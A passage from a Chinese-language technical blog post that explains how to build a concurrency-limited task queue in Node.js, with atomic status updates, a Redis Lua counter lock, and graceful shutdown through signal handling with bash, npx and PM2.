<p>由于任务本身已经由锁控制了并发执行，因此接下来只需要控制好任务的执行流程即可，而控制异步任务的方法通常有两种方式，类似于<code>webpack</code>的插件实现，一种方式是类似于控制反转的方式将<code>done</code>函数传递到任务中，另一种方式则是直接在任务中返回<code>Promise</code>对象，这里我们就直接采用异步模式。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-keyword">void</span>&gt; {
  <span class="hljs-keyword">const</span> assigned = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">assign</span>();
  <span class="hljs-keyword">if</span> (!assigned) <span class="hljs-keyword">return</span> <span class="hljs-keyword">void</span> <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> <span class="hljs-attr">id</span>: string | <span class="hljs-literal">undefined</span> = <span class="hljs-keyword">void</span> <span class="hljs-number">0</span>;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">runningTasks</span>++;
  <span class="hljs-keyword">try</span> {
    id = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">onRunning</span>();
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Task Queue Running Error:"</span>, error);
  }
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">runningTasks</span>--;
  <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">release</span>();
  id &amp;&amp; process.<span class="hljs-title function_">nextTick</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">tryRun</span>);
}
</code></pre>
<p>在这里我们需要将<code>onRunning</code>方法重写，也就是在服务中将内置方法赋值到类上，通常这个方法主要是从数据库中取出任务并执行，执行完成后返回任务的<code>id</code>，如果没有任务则返回<code>undefined</code>。而这个<code>id</code>则会标识后续的任务是否会继续执行，这里的<code>nextTick</code>主要是为了避免栈溢出的问题。</p>
<p>如果在任务调度中直接递归地执行，则会存在堆栈溢出的可能。在下面<code>recursion</code>这个例子中，如果是同步的的函数执行，则会抛出<code>Maximum call stack size exceeded</code>的异常。而如果是异步递归函数<code>asyncRecursion</code>，每次递归调用都是在下一个事件循环中执行的，避免了溢出问题。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">recursion</span>(<span class="hljs-params">n</span>) {
  <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;
  n % <span class="hljs-number">100</span> === <span class="hljs-number">0</span>  &amp;&amp; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Depth: <span class="hljs-subst">${n}</span>`</span>); <span class="hljs-comment">// $</span>
  <span class="hljs-title function_">recursion</span>(n - <span class="hljs-number">1</span>)
}
<span class="hljs-title function_">recursion</span>(<span class="hljs-number">100000</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">asyncRecursion</span>(<span class="hljs-params">n</span>) {
  <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;
  n % <span class="hljs-number">100</span> === <span class="hljs-number">0</span>  &amp;&amp; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Depth: <span class="hljs-subst">${n}</span>`</span>); <span class="hljs-comment">// $</span>
  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">asyncRecursion</span>(n - <span class="hljs-number">1</span>));
}
<span class="hljs-title function_">asyncRecursion</span>(<span class="hljs-number">100000</span>);
</code></pre>
<p>并发执行任务执行就需要实际启动这个<code>run</code>函数，不断尝试调度任务并且执行，而调度任务的方式自然就是通过循环来实现批量调度。这里需要注意的是，执行<code>run</code>函数的时候不能<code>await</code>，否则就会阻塞当前的事件循环，从而无法实现并发执行任务。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">tryRun</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-keyword">void</span>&gt; {
  <span class="hljs-keyword">const</span> batch = <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxTasks</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">runningTasks</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; batch; i++) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">run</span>();
  }
}
</code></pre>
<p>不过这里其实有个问题，如果此时没有任务可以调度，还是会尝试<code>maxTasks</code>次任务执行，这其实是会存在数据库无效读的问题。不过对于数据库来说这里的读操作通常是可以接受的，数据库里状态值是要加索引的，如果实在不可接受就需要排队延迟<code>run</code>的执行，例如前个任务<code>10s</code>内返回空就不执行。</p>
<h3 data-id="heading-3">原子读写</h3>
<p>那么重写<code>onRunning</code>方法的实现，主要是从数据库中读取任务并执行。假设我们查找数据是使用<code>find</code>语句，写数据是使用<code>update</code>语句，那么假设此时的状态字段为<code>status</code>，我们可以定义如下的状态，<code>pending</code>待处理、<code>running</code>处理中、<code>completed</code>完成，<code>failed</code>失败。</p>
<p>那么假设现在已经有<code>id</code>为<code>1</code>和<code>2</code>的两个任务处于<code>pending</code>状态，并且我们允许最大的并发数为<code>2</code>。此时我们在两个独立的任务中进行任务调度，第一步就是查询数据库中状态为<code>pending</code>的任务，并且将其状态更新为<code>running</code>。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 任务 1</span>
<span class="hljs-keyword">await</span> find status=<span class="hljs-string">"pending"</span>
update id=$0 status=<span class="hljs-string">"running"</span> <span class="hljs-comment">// $</span>
<span class="hljs-comment">// 任务 2</span>
<span class="hljs-keyword">await</span> find status=<span class="hljs-string">"pending"</span>
update id=$0 status=<span class="hljs-string">"running"</span> <span class="hljs-comment">// $</span>
</code></pre>
<p>看起来这个调度并没有什么问题，但是实际上会存在竞态条件的问题。由于任务<code>1</code>和任务<code>2</code>同时执行查询语句，那么两个任务都会查询到<code>id=1</code>的任务，然后两个任务都会将其状态更新为<code>running</code>，这样就会导致同一个任务被多个进程处理。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 任务 1</span>
<span class="hljs-keyword">await</span> find status=<span class="hljs-string">"pending"</span> -&gt; id=<span class="hljs-number">1</span>
<span class="hljs-comment">// 任务 2</span>
<span class="hljs-keyword">await</span> find status=<span class="hljs-string">"pending"</span> -&gt; id=<span class="hljs-number">1</span>
</code></pre>
<p>究其原因，是因为查询和更新是两个独立的操作，并行的任务会同时触发查询，而本身并没有锁来保证查询到的任务在更新前不会被其他任务修改。因此在并行执行时，需要保证读写状态的操作是原子性的，也就是需要将查询和更新合并为一个操作，例如在<code>mongodb</code>中就存在<code>findOneAndUpdate</code>方法。</p>
<p>那么在这里我们同样模拟一下数据处理的逻辑，由于<code>Service</code>现在是单例的，因此我们直接维护一个二维数组来存储任务。在这里我们实现一个<code>findAndModify</code>方法来模拟数据库的查询和更新操作，这个方法会根据传入的查询条件查找任务，并且将其状态更新为新的状态。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TasksService</span> {
  public <span class="hljs-attr">tasks</span>: { <span class="hljs-attr">id</span>: string; <span class="hljs-attr">status</span>: <span class="hljs-string">"pending"</span> | <span class="hljs-string">"running"</span> | <span class="hljs-string">"success"</span> | <span class="hljs-string">"fail"</span> }[]

  private <span class="hljs-keyword">async</span> <span class="hljs-title function_">findAndModify</span>(<span class="hljs-params">
    find: { id?: string; status?: <span class="hljs-keyword">typeof</span> TasksService.prototype.tasks[<span class="hljs-number">0</span>][<span class="hljs-string">"status"</span>] } = {},
    status: <span class="hljs-keyword">typeof</span> TasksService.prototype.tasks[<span class="hljs-number">0</span>][<span class="hljs-string">"status"</span>]
  </span>) {
    <span class="hljs-keyword">const</span> task = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (find.<span class="hljs-property">id</span> &amp;&amp; t.<span class="hljs-property">id</span> !== find.<span class="hljs-property">id</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
      <span class="hljs-keyword">if</span> (find.<span class="hljs-property">status</span> &amp;&amp; t.<span class="hljs-property">status</span> !== find.<span class="hljs-property">status</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    });
    <span class="hljs-keyword">if</span> (task) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Task <span class="hljs-subst">${task.id}</span> is <span class="hljs-subst">${task.status}</span> =&gt; <span class="hljs-subst">${status}</span>.`</span>);
      task.<span class="hljs-property">status</span> = status;
      <span class="hljs-keyword">return</span> task;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  }
}
</code></pre>
<p>而重写<code>running</code>方法运行任务时，我们就可以调用这个<code>findAndModify</code>方法来查询并更新任务状态，从而保证任务的原子性。这里我们模拟任务的执行时间超时时间为<code>2s</code>，任务本身是随机生成的执行时长，这里的状态转移同样是使用上述方法来严格控制状态转移，当然也可以用变量标记来处理。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">onRunning</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> task = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">findAndModify</span>({ <span class="hljs-attr">status</span>: <span class="hljs-string">"pending"</span> }, <span class="hljs-string">"running"</span>);
  <span class="hljs-keyword">if</span> (!task) <span class="hljs-keyword">return</span> <span class="hljs-keyword">void</span> <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">execute</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">3000</span>));
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">findAndModify</span>({ <span class="hljs-attr">id</span>: task.<span class="hljs-property">id</span>, <span class="hljs-attr">status</span>: <span class="hljs-string">"running"</span> }, <span class="hljs-string">"success"</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Task <span class="hljs-subst">${task.id}</span> cost <span class="hljs-subst">${<span class="hljs-built_in">Date</span>.now() - now}</span> ms.`</span>);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">findAndModify</span>({ <span class="hljs-attr">id</span>: task.<span class="hljs-property">id</span>, <span class="hljs-attr">status</span>: <span class="hljs-string">"running"</span> }, <span class="hljs-string">"fail"</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Task"</span>, task.<span class="hljs-property">id</span>, <span class="hljs-string">"is fail."</span>, error);
    }
  };
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">timeout</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">ms: number</span>) =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(ms);
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">findAndModify</span>({ <span class="hljs-attr">id</span>: task.<span class="hljs-property">id</span>, <span class="hljs-attr">status</span>: <span class="hljs-string">"running"</span> }, <span class="hljs-string">"fail"</span>);
  };
  <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-title function_">execute</span>(), <span class="hljs-title function_">timeout</span>(<span class="hljs-number">2000</span>)]);
  <span class="hljs-keyword">return</span> task.<span class="hljs-property">id</span>;
}
</code></pre>
<p>接下来基本已经完成了单实例单进程的任务队列实现，接下来我们就通过接口实现任务的创建和执行。并且在接口中定义好任务创建的方法，在下面的例子中我们批量创建<code>5</code>个任务，然后会调用队列的<code>tryRun</code>方法来尝试调度任务。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createTask</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> id = <span class="hljs-string">`task_<span class="hljs-subst">${<span class="hljs-built_in">Date</span>.now()}</span>_<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">1000</span>)}</span>`</span>;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-title function_">push</span>({ id, <span class="hljs-attr">status</span>: <span class="hljs-string">"pending"</span> });
  <span class="hljs-keyword">return</span> { id };
}

@<span class="hljs-title class_">Controller</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> {
  @<span class="hljs-title class_">Inject</span>(<span class="hljs-title class_">IndexService</span>)
  private readonly indexService!: <span class="hljs-title class_">IndexService</span>;
  @<span class="hljs-title class_">Post</span>(<span class="hljs-string">"batch-create-task"</span>)
  public <span class="hljs-keyword">async</span> <span class="hljs-title function_">createTask</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// curl -X POST http://localhost:3000/batch-create-task</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasksService</span>.<span class="hljs-title function_">createTask</span>();
    }
  }
}
</code></pre>
<p>当执行完成<code>curl</code>后，我们就可以看到任务被顺序调度执行，并且并发数被限制在<code>2</code>以内。当然由于本身任务的执行时间是随机的，因此实际的执行顺序以及任务的状态成功与否都是不确定的。</p>
<pre><code class="hljs language-ini" lang="ini">Lock Assign _lock_key 0 -&gt; 1
Lock Assign _lock_key 1 -&gt; 2
Task task_1762683026625_272 is <span class="hljs-attr">pending</span> =&gt; running.
Task task_1762683026625_164 is <span class="hljs-attr">pending</span> =&gt; running.
Task task_1762683026625_272 is <span class="hljs-attr">running</span> =&gt; success.
Task task_1762683026625_272 cost 534 ms.
Task task_1762683026625_164 is <span class="hljs-attr">running</span> =&gt; success.
Task task_1762683026625_164 cost 1556 ms.
Lock Release _lock_key 2 -&gt; 1
Lock Assign _lock_key 1 -&gt; 2
Task task_1762683026625_300 is <span class="hljs-attr">pending</span> =&gt; running.
Lock Release _lock_key 2 -&gt; 1
Lock Assign _lock_key 1 -&gt; 2
Task task_1762683026625_944 is <span class="hljs-attr">pending</span> =&gt; running.
Task task_1762683026625_300 is <span class="hljs-attr">running</span> =&gt; success.
Task task_1762683026625_300 cost 378 ms.
Task task_1762683026625_944 is <span class="hljs-attr">running</span> =&gt; success.
Task task_1762683026625_944 cost 1852 ms.
Lock Release _lock_key 2 -&gt; 1
Lock Assign _lock_key 1 -&gt; 2
Task task_1762683026625_42 is <span class="hljs-attr">pending</span> =&gt; running.
Lock Release _lock_key 2 -&gt; 1
Lock Assign _lock_key 1 -&gt; 2
Lock Release _lock_key 2 -&gt; 1
Task task_1762683026625_42 is <span class="hljs-attr">running</span> =&gt; success.
Task task_1762683026625_42 cost 1119 ms.
Lock Release _lock_key 1 -&gt; 0
Lock Assign _lock_key 0 -&gt; 1
Lock Assign _lock_key 1 -&gt; 2
Lock Release _lock_key 2 -&gt; 1
Lock Release _lock_key 1 -&gt; 0
</code></pre>
<h3 data-id="heading-4">分布式锁</h3>
<p>实际上关于锁的问题，上述的单进程模式仅需要处理内存，而如果是单机集群模式，即多进程模式可以共享内存或者使用文件系统处理。然而现在常见的都是分布式多实例模式，这种情况下则需要使用<code>Redis</code>等外部存储，因为需要一个集中式的锁管理。</p>
<p>此外，<code>Redis</code>提供了<code>RedLock</code>算法可以实现分布式互斥，也就是阻止并发，因此并不适合我们这里的任务队列场景。还有<code>Redis</code>分布式主从部署的情况下，若是<code>Redis</code>主节点挂掉，从节点晋升为主节点时，可能会导致短暂的任务超限，即同时运行的任务数超过<code>MaxTask</code>。</p>
<p>因此这里我们需要将内存的锁实现替换为<code>Redis</code>的分布式锁实现，对比内存的实现，由于本身<code>Redis</code>支持<code>incr</code>和<code>decr</code>原子操作，但是其不能限制其数据范围，因此我们需要使用<code>LUA</code>脚本来实现分布式锁的功能。下面是并行任务的<code>LUA</code>实现:</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * Redis 自增锁 LUA 脚本
 * - KEYS[1]: 锁的键名
 * - ARGV[1]: 最大任务数 MaxTask
 * <span class="hljs-doctag">@example</span> ioredis.eval(LUA_SCRIPT, 1, LOCK_KEY, MAX_TASK);
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">INCR_LOCK_LUA</span> = <span class="hljs-string">`
  local current = redis.call("GET", KEYS[1])

  if not current then
    current = 0
  else
    current = tonumber(current)
  end

  if current &gt;= tonumber(ARGV[1]) then
    return -1
  end

  local new_count = redis.call("INCR", KEYS[1])
  return new_count
`</span>;

<span class="hljs-comment">/**
 * Redis 自减锁 LUA 脚本
 * - KEYS[1]: 锁的键名
 * <span class="hljs-doctag">@example</span> ioredis.eval(LUA_SCRIPT, 1, LOCK_KEY);
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DESC_LOCK_LUA</span> = <span class="hljs-string">`
  local current = redis.call("GET", KEYS[1])
  
  if not current then
    return 0
  end

  current = tonumber(current)
  if current &lt;= 0 then
    return 0
  end

  local new_count = redis.call("DECR", KEYS[1])
  return new_count
`</span>;
</code></pre>
<h2 data-id="heading-5">优雅停机</h2>
<p>优雅停机的处理要更复杂一些，因为其不能完全依靠框架本身的处理能力，而是需要我们在应用层进行处理。即我们必须要将信号传递到进程中，如果进程没有收到信号的话，那么就无法进行优雅停机的处理，即使是处理好了相关资源的清理，也没有实际效用。</p>
<p>特别的，在分布式部署的情况下我们都是部署在<code>Docker</code>容器中，在这种情况下信号的传递就非常依赖容器本身的配置，以及守护进程的方式。假设停机信号仅发送给主进程而不像是<code>Ctrl+C</code>一样发送给进程组，那么优雅停机就必须要主动将信号传递到子进程中，否则子进程将无法进行停机处理。</p>
<h3 data-id="heading-6">SIGINT</h3>
<p><code>SIGINT</code>信号就是我们主要关注的信号类型，当我们在终端中按下<code>Ctrl+C</code>时，系统会向当前前台进程组发送<code>SIGINT</code>信号，从而触发进程的中断处理。在<code>kill</code>命令中，<code>SIGINT</code>信号的编号为<code>2</code>，因此我们也可以通过<code>kill -2 &lt;pid&gt;</code>或者<code>kill -INT &lt;pid&gt;</code>命令来发送该信号。</p>
<p>在这里我们来实现简单的<code>SIGINT</code>信号处理，需要创建简单的<code>HTTP</code>服务器，然后通过监听<code>process.on("SIGINT")</code>事件来处理信号。当我们执行<code>Ctrl+C</code>时，服务器不会立即关闭，而是会输出等待的提示，接下来等待<code>2s</code>后关闭，然后才会退出进程。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">_, res</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Received Request"</span>, <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>());
  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"text/plain"</span> });
  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">"Hello, World!\n"</span>);
});

process.<span class="hljs-title function_">on</span>(<span class="hljs-string">"SIGINT"</span>, <span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Received SIGINT. Shutting Down Gracefully..."</span>);
  <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(r, <span class="hljs-number">2000</span>));
  server.<span class="hljs-title function_">close</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Server Closed. Exiting Process."</span>);
    process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>);
  });
});

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">3000</span>;
server.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server Running at http://localhost:<span class="hljs-subst">${PORT}</span>/`</span>);
});
</code></pre>
<h3 data-id="heading-7">信号传递</h3>
<p><code>Ctrl+C</code>会给整个前台进程组发送<code>SIGINT</code>信号，但是在业务中可能会仅可能给主进程发送<code>SIGINT</code>信号，这时候子进程就无法收到信号。我们可以来模拟一下这个行为，当使用<code>npx</code>命令时，其并不会将信号转发到其启动的子进程。此外还有个常用的信号是<code>SIGTERM</code>，编号为<code>15</code>。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ps -A -o pid,ppid,comm,args &gt; ps.txt</span>
<span class="hljs-comment"># lsof -i :3000</span>
<span class="hljs-comment"># kill -INT 1234</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"signal.sh PID-PPID $$,<span class="hljs-variable">$PPID</span>"</span>
npx tsx ./src/index.ts
</code></pre>
<p>当使用<code>bash signal.sh</code>启动脚本时，先输出当前进程的<code>PID</code>和以及父进程的<code>PPID</code>。此时由于进程是<code>bash</code>启动的，因此<code>PPID</code>是<code>bash</code>的进程号，接下来使用<code>npx tsx</code>启动<code>NodeJs</code>进程，此时<code>NodeJs</code>进程的父进程就是<code>npx</code>进程，假设输出是下面的<code>id</code>:</p>
<pre><code class="hljs language-bash" lang="bash">signal.sh PID-PPID 66721,59534
59534 51513 /bin/zsh         /bin/zsh -il                 <span class="hljs-comment"># zsh shell</span>
66721 59534 bash             bash signal.sh               <span class="hljs-comment"># bash </span>
66722 66721 npm <span class="hljs-built_in">exec</span> tsx ./s npm <span class="hljs-built_in">exec</span> tsx ./src/index.ts  <span class="hljs-comment"># npx tsx</span>
</code></pre>
<p>此时如果执行<code>kill -INT 66721</code>命令发送到脚本进程，会发现<code>NodeJs</code>进程并没有收到信号，因此无法进行优雅停机处理。通常在这种情况下只能等待一定时间后强制杀死子进程，也就是<code>kill -9 &lt;pid&gt;</code>或者<code>kill -KILL &lt;pid&gt;</code>命令。而如果直接<code>kill -2 66722</code>，则可以正常停机。</p>
<p>我们的假设是信号仅发送到主进程，而此时的主进程就是<code>bash</code>启动命令，无法结束进程就很合理了。这里问题其实就在于我们是使用<code>npx</code>启动的进程，这个命令会启动一个新的进程来执行服务的启动命令，在信号不传递的情况下，子进程是无法收到信号的。</p>
<p>在<code>Bash</code>中，我们可以使用<code>exec</code>命令用于替换当前的<code>Shell</code>进程，而不是创建新的子进程。因此，如果我们在<code>npx</code>命令前使用<code>exec</code>来替换掉当前的<code>bash</code>进程，那么信号就可以直接传递到<code>NodeJs</code>进程中了。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">exec</span> npx tsx ./src/index.ts
</code></pre>
<p>此时的进程关系如下所示，此时的主进程就是<code>67033</code>进程号了，此时直接<code>kill -INT 67033</code>就可以正常收到信号并且进行优雅停机处理了。这里还需要关注一下，我们是直接使用终端执行的命令，所以其本身的进程<code>59534</code>即<code>zsh</code>进程号就是父进程号。</p>
<pre><code class="hljs language-bash" lang="bash">signal.sh PID-PPID 67033,59534
59534 51513 /bin/zsh         /bin/zsh -il
67033 59534 npm <span class="hljs-built_in">exec</span> tsx ./s npm <span class="hljs-built_in">exec</span> tsx ./src/index.ts   
</code></pre>
<p>由于<code>npx</code>会创建子进程来执行命令，因此若是启动服务的命令本身如果也是创建子进程的方式，那么同样会存在信号无法传递的问题。因此在使用<code>pm2</code>等进程管理工具时，也需要注意其启动命令的信号传递问题，那么这种情况下我们可以避免使用<code>npx</code>命令来启动进程，此时服务就作为顶层进程启动了。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"<span class="hljs-variable">$PWD</span>/node_modules/.bin:<span class="hljs-variable">$PATH</span>"</span>
<span class="hljs-built_in">exec</span> tsx ./src/index.ts
</code></pre>
<pre><code class="hljs language-bash" lang="bash">signal.sh PID-PPID 67675,59534
59534 51513 /bin/zsh         /bin/zsh -il
67675 59534 node             node /xxx/node_modules/.bin/../tsx/dist/cli.mjs ./src/index.ts
</code></pre>
<h3 data-id="heading-8">子进程管理</h3>
<p>由于下面需要以<code>PM2</code>在集群模式下实现信号传递，在这里我们就先做一个简单有趣的实验，主要是为了观察子进程执行的情况。通常情况下我们会在部署环境中使用容器内的进程例如<code>systemd</code>来守护进程，并不会使用<code>pm2</code>的守护进程，但是如果直接使用<code>pm2</code>守护，那就需要主动传递信号。</p>
<p>因此在这里我们实现一个简单的父子进程模型，相当于简单地表示一下进程的模型。<code>child.sh</code>是普通的脚本，在这里会直接使用<code>while</code>来保持进程。<code>normal.sh</code>是父进程脚本，使用<code>bash</code>启动<code>child.sh</code>作为子进程。<code>fork.sh</code>也是父进程脚本，但是会使用<code>disown</code>来分离进程。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># child.sh</span>
<span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">sleep</span> 1
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"child.sh PID-PPID $$,<span class="hljs-variable">$PPID</span>"</span>
<span class="hljs-keyword">done</span>
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># normal.sh</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"normal.sh PID-PPID $$,<span class="hljs-variable">$PPID</span>"</span>
bash child.sh &gt; /dev/tty 2&gt;&amp;1
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># fork.sh</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"fork.sh PID-PPID $$,<span class="hljs-variable">$PPID</span>"</span>
bash child.sh &gt; /dev/tty 2&gt;&amp;1 &amp;
<span class="hljs-built_in">disown</span> -h %1
</code></pre>
<p>当我们分别使用两个终端来启动<code>normal.sh</code>以及<code>fork.sh</code>后，可以观察到<code>normal</code>进程会持有且不会停止，<code>fork</code>进程会结束先前的进程，可以在终端里执行其他命令，类似于将其放置于后台，注意输出重定向到<code>tty</code>终端不会停, 也可以输出到文件。</p>
<pre><code class="hljs language-bash" lang="bash">normal.sh PID-PPID 70263,69842
child.sh PID-PPID 70264,70263
69842 51513 /bin/zsh         /bin/zsh -il
70263 69842 bash             bash normal.sh
70264 70263 bash             bash child.sh
72259 70264 <span class="hljs-built_in">sleep</span>            <span class="hljs-built_in">sleep</span> 1
</code></pre>
<pre><code class="hljs language-bash" lang="bash">fork.sh PID-PPID 70303,69954
child.sh PID-PPID 70304,1
69954 51513 /bin/zsh         /bin/zsh -il
70304     1 bash             bash child.sh
72260 70304 <span class="hljs-built_in">sleep</span>            <span class="hljs-built_in">sleep</span> 1
</code></pre>
<h3 data-id="heading-9">PM2 进程</h3>
<p>在先前的实验中我们已经观察到了信号传递的问题，那么在<code>pm2</code>中同样会存在这个问题。假设我们使用<code>pm2 start</code>来启动进程，这种情况下就是使用<code>fork</code>模式启动的进程，因此信号是无法传递到子进程中的，因为这个进程会立即结束掉。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> PORT=3000
<span class="hljs-built_in">echo</span> <span class="hljs-string">"bootstrap.sh PID-PPID $$,<span class="hljs-variable">$PPID</span>"</span>
npx tsc --project tsconfig.json
<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"<span class="hljs-variable">$PWD</span>/node_modules/.bin:<span class="hljs-variable">$PATH</span>"</span>
<span class="hljs-built_in">exec</span> pm2 start ./dist/index.js -i 2 --kill-timeout 5000 --log-date-format=<span class="hljs-string">"YYYY-MM-DD HH:mm:ss"</span> --<span class="hljs-built_in">log</span> ./output.log
</code></pre>
<p>此时的进程树关系如下，由于进程会立即结束，此时<code>pm2</code>的主进程的父进程就是<code>1</code>。然后由于是使用的集群模式，因此会启动两个子进程来执行服务，而这两个子进程的父进程就是<code>pm2</code>的主进程，此时我们是没有办法发送<code>SIGINT</code>信号给主进程，自然子进程也无法收到信号。</p>
